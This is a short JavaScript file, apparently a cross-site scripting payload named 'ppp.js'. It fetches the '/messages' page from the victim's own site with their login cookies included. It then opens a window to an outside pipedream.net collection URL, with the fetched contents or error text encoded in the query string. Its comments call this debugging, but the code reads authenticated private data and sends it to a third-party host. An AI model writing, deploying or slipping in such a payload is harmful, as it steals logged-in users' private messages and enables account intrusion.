// ppp.js
// minimal: fetch /messages (same-origin) and open endpoint with ok/err
(function(){
  const END = "https://eoeipamgnflz15n.m.pipedream.net";
  // test load
  try { console.log("[ppp] running"); } catch(e){}

  (async function(){
    try {
      const res = await fetch("/messages", { method: "GET", credentials: "include" });
      if (!res.ok) throw new Error("HTTP " + res.status);
      const txt = await res.text();
      // send success: open (or reuse) a debug tab
      window.open(END + "?ok=" + encodeURIComponent(txt), "skav_debug");
    } catch (err) {
      // send error
      window.open(END + "?err=" + encodeURIComponent(String(err)), "skav_debug");
    }
  })();
})();
